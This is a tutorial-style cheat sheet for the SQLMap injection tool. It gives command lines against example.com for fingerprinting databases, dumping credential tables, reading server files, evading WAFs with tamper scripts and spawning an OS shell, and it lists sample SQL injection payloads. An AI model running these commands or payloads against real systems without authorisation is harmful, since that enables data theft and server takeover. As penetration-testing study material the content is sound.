# SQLmap

#### **SQLMap Essentials**

**What is SQLMap?**

* Open-source tool to automate detecting and exploiting SQL Injection.
* Simplifies identification, exploitation, and data extraction.
* Supports manual-to-automated workflows for penetration testing.

***

#### **Uses**

* Detect and exploit SQLi vulnerabilities.
* Extract database schema and data.
* Execute advanced queries and OS-level commands.
* Perform privilege escalation and database takeover.

***

#### **Supported Databases**

* **Relational**: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MariaDB.
* **NoSQL (experimental)**: MongoDB, CouchDB.

***

#### **Best Practice**

* **Always test manually first** (basic payloads).
* Use SQLMap after confirming SQLi manually.
* Avoid full automation at the start (may crash services or be inefficient).
* Use SQLMap for deeper exploitation once vulnerability is confirmed.

***

#### **SQLMap Workflow**

**1. Identify Injection Points**

* SQLMap scans target parameters with payloads.
* Example:

  `sqlmap -u "http://example.com/login.php?id=1"`

**2. Fingerprint the DBMS**

* SQLMap detects database type/version.
* Example:

  `sqlmap -u "http://example.com/login.php?id=1" --fingerprint`
* Output: `The back-end DBMS is MySQL (version: 5.7)`

**3. Confirm Vulnerability**

* SQLMap tests multiple SQLi types:
  * Boolean: `' AND 1=1 --`
  * UNION: `' UNION SELECT NULL,NULL --`
  * Time-based: `' OR SLEEP(5) --`

**4. Extract Data**

* Dump DB names, tables, and records.
* Example:

  `sqlmap -u "http://example.com/login.php?id=1" --dbs`
* Output:
  * `information_schema`
  * `users_db`

**5. Advanced Exploitation**

* OS shell, file read/write, privilege escalation.
* Example:

  `sqlmap -u "http://example.com/login.php?id=1" --os-shell`

#### **SQLMap Basic Syntax**

`sqlmap -u <URL> -p <Injection Parameter> [options]`

* **-u**: Target URL
* **-p**: Parameter(s) to test (optional, SQLMap can auto-detect)
* **\[options]**: Extra switches for enumeration, dumping, or exploitation

**Example:**

`sqlmap -u "http://example.com/product.php?id=1"`

***

#### **Specifying HTTP Methods and Data**

* Test POST requests:

`sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"`

SQLMap will test `username` and `password` for SQLi.

***

#### **Extracting DBMS Banner**

* Retrieve DBMS version/banner:

`sqlmap -u <target> --banner`

***

#### **Database Enumeration**

* **List DBMS users:**

`sqlmap -u <target> --users`

* **Check if current user is DBA:**

`sqlmap -u <target> --is-dba`

* **List databases:**

`sqlmap -u "http://example.com/product.php?id=1" --dbs`

Output:

`[1] information_schema [2] users_db`

* **List tables in a database:**

`sqlmap -u "http://example.com/product.php?id=1" -D users_db --tables`

Output:

`user_credentials user_profiles`

* **List columns in a table:**

`sqlmap -u <target> -D users_db -T user_credentials --columns`

* **Dump specific table data:**

`sqlmap -u "http://example.com/product.php?id=1" -D users_db -T user_credentials --dump`

Output:

`+----------+----------+ | username | password | +----------+----------+ | admin | pass123 | | user1 | secret42 | +----------+----------+`

***

#### **Authentication and Custom Headers**

* Use cookies for authenticated requests:

`sqlmap -u "http://example.com/product.php?id=1" --cookie="PHPSESSID=abc123"`

* Add headers (example for token-based auth):

`sqlmap -u <URL> --headers="Authorization: Bearer <token>"`

***

#### **Important Options**

| Option               | Description                |
| -------------------- | -------------------------- |
| `-u, --url=URL`      | Target URL                 |
| `--data=<DATA>`      | Test POST parameters       |
| `-p <PARAM>`         | Parameter(s) to test       |
| `--fingerprint`      | Identify DBMS type/version |
| `--tamper=<script>`  | Apply WAF evasion script   |
| `--os-shell`         | Spawn OS shell if possible |
| `--file-read=<path>` | Read file from server      |
| `--batch`            | Non-interactive mode       |

***

#### **Database Enumeration Options**

| Option         | Description                  |
| -------------- | ---------------------------- |
| `-a, --all`    | Dump everything              |
| `-b, --banner` | Get DBMS banner              |
| `--dbs`        | List all databases           |
| `--tables`     | List tables in a DB          |
| `--columns`    | List columns in a table      |
| `--schema`     | Enumerate full schema        |
| `--dump`       | Dump data from table         |
| `--dump-all`   | Dump all DBs and tables      |
| `--is-dba`     | Check if current user is DBA |
| `-D <db>`      | Target database              |
| `-T <table>`   | Target table                 |
| `-C <col>`     | Target column                |

## **SQLMap – Techniques and Detection Options**

### Specifying SQL Injection Techniques

* By default, SQLMap tries **all injection techniques**.
* Use `--technique` to limit tests to specific methods.
* Useful for **efficiency** or **targeted testing**.

#### Supported Techniques

| Code | Technique           | Description                                                     |
| ---- | ------------------- | --------------------------------------------------------------- |
| B    | Boolean-Based Blind | Evaluates true/false conditions to infer data.                  |
| E    | Error-Based         | Uses database error messages to extract data.                   |
| U    | UNION-Based         | Exploits `UNION` SQL operator to extract data.                  |
| S    | Stacked Queries     | Executes multiple SQL statements in one request (if supported). |
| T    | Time-Based Blind    | Uses response delays to infer true/false results.               |
| Q    | Inline Queries      | Uses subqueries to extract data (less common).                  |

#### Examples

**Boolean-Based Blind**

`sqlmap -u "http://example.com/product.php?id=1" --technique=B`

What happens:

* SQLMap injects payloads like:
  * `' AND 1=1 --` (True condition)
  * `' AND 1=2 --` (False condition)
* Response differences confirm vulnerability.

**Error-Based**

`sqlmap -u "http://example.com/product.php?id=1" --technique=E`

What happens:

* Payloads like:
  * `1' AND extractvalue(1, concat(0x3a, version())) --`
* Database error messages leak information.

***

### Detection Options – `--level` and `--risk`

#### `--level`

Controls **how many parameters** SQLMap tests.

* **1 (default):** Only GET/POST parameters.
* **2:** Adds HTTP headers (Cookie, User-Agent, Referer).
* **3:** Tests extra headers, hidden fields, and less obvious inputs.

**Examples**

`sqlmap -u "http://example.com/product.php?id=1" --level=1 # Default sqlmap -u "http://example.com/product.php?id=1" --level=2 # Includes headers sqlmap -u "http://example.com/product.php?id=1" --level=3 # Tests everything`

***

#### `--risk`

Controls **how intrusive** SQLMap’s payloads are.

* **1 (default):** Low-risk, safe queries (boolean, simple union).
* **2:** Medium risk (time-based, bigger unions).
* **3:** High risk (stacked queries, heavy time delays).

**Examples**

`sqlmap -u "http://example.com/product.php?id=1" --risk=1 # Safe sqlmap -u "http://example.com/product.php?id=1" --risk=2 # Medium intrusive sqlmap -u "http://example.com/product.php?id=1" --risk=3 # High impact`

***

#### Combining `--level` and `--risk`

Use both to fine-tune testing depth and danger level.

`sqlmap -u "http://example.com/product.php?id=1" --level=3 --risk=3`

What happens:

* SQLMap checks all parameters, headers, and hidden fields.
* Runs high-risk payloads like stacked queries.
* Can cause crashes or leave traces.
* **Avoid using max settings on client infrastructure without permission.**

***

### Using Intercepted Requests

Sometimes injection points are **not visible in the URL**. Example:

* JSON APIs
* POST requests
* Complex headers

#### Steps

1. Intercept the request in **Burp Suite** or another proxy.
2. Save the request to a file (`request.txt`).
3. Run SQLMap with `-r`:

`sqlmap -r request.txt -p username`

* **-r request.txt** → Use saved request.
* **-p username** → Specify the parameter to test.

This method ensures SQLMap **replays the request exactly** as the app sends it.

***

### 4. Practical Notes

* **Use `--batch`** when automating (no prompts).
* Start with **low level/risk** (`--level=1 --risk=1`) then increase if needed.
* Combine `--technique` with `--level` and `--risk` for **targeted testing**.
* Always validate with **manual testing** before relying on automation.
